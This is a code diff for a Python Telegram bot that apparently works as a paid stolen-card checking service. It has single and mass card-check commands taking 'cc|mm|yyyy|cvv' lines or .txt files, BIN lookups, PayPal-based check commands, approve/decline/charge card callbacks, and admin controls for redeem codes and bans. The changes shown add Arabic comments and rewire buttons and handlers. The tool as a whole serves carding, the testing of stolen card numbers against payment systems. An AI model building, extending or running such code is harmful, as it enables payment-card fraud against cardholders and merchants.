     data = query.data
@@ -1604,8 +1399,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 {fb('Status')}: {fb(plan)}
 ━━━━━━━━━━━━━━
 {fb('Use the buttons below to navigate.')}"""
-        menu = build_main_menu(user_id)
-        send_colored_buttons(chat_id, text, menu)
+        send_colored_buttons(chat_id, text, build_main_menu())
 
     elif data == "tools":
         text = f"""
@@ -1698,10 +1492,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 """
         await query.message.reply_text(text, parse_mode="HTML")
 
-    elif data == "mass_stop":
-        stop_all_checks()
-        await query.answer(fb("⏹ Stopped!"), show_alert=True)
-
     elif data == "tool_chk":
         text = f"{fb('Single Card Check')}\n\n{fb('Send card in format:')}\n<code>cc|mm|yyyy|cvv</code>"
         buttons = [[b_blue(fb("Back"), "tools")]]
@@ -1709,7 +1499,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["state"] = "chk"
 
     elif data == "tool_mass":
-        text = f"{fb('Mass Check')}\n\n{fb('Send a .txt file with cards.')}"
+        text = f"{fb('Mass Check')}\n\n{fb('Send a .txt file with cards.')}\n{fb('Press /stopcheck to halt.')}"
         buttons = [[b_blue(fb("Back"), "tools")]]
         send_colored_buttons(chat_id, text, buttons)
 
@@ -1735,6 +1525,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         send_colored_buttons(chat_id, text, buttons)
         context.user_data["state"] = "px"
 
+    elif data.startswith("approve_") or data.startswith("decline_") or data.startswith("charge_") or data.startswith("error_"):
+        await card_actions(update, context)
+
+    elif data == "mass_stop":
+        stop_all_checks()
+        await query.answer(fb("Stop signal sent!"), show_alert=True)
+
+
 # ============================================================
 # MAIN
 # ============================================================
@@ -1752,6 +1550,7 @@ BIN Cache: Enabled
     
     application = Application.builder().token(BOT_TOKEN).build()
     
+    # الأوامر الأساسية
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("chk", cmd_chk))
     application.add_handler(CommandHandler("bin", cmd_bin))
@@ -1759,10 +1558,11 @@ BIN Cache: Enabled
     application.add_handler(CommandHandler("redeem", cmd_redeem))
     application.add_handler(CommandHandler("stopcheck", cmd_stopcheck))
     
-    # PayPal Jazz Commands
+    # أوامر PayPal Jazz
     application.add_handler(CommandHandler("pp", cmd_pp))
     application.add_handler(CommandHandler("px", cmd_px))
     
+    # أوامر الأدمن
     application.add_handler(CommandHandler("code", cmd_code))
     application.add_handler(CommandHandler("ban", cmd_ban))
     application.add_handler(CommandHandler("unban", cmd_unban))
@@ -1775,12 +1575,14 @@ BIN Cache: Enabled
     application.add_handler(CommandHandler("restart", cmd_restart))
     application.add_handler(CommandHandler("clear", cmd_clear))
     
+    # الأوامر المختصرة
     application.add_handler(CommandHandler("gr", cmd_gr))
     application.add_handler(CommandHandler("bu", cmd_bu))
     application.add_handler(CommandHandler("lu", cmd_lu))
     application.add_handler(CommandHandler("sp", cmd_sp))
     application.add_handler(CommandHandler("st", cmd_st))
     
+    # معالجات الأزرار
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
     application.add_handler(MessageHandler(filters.Document.ALL, document_handler))
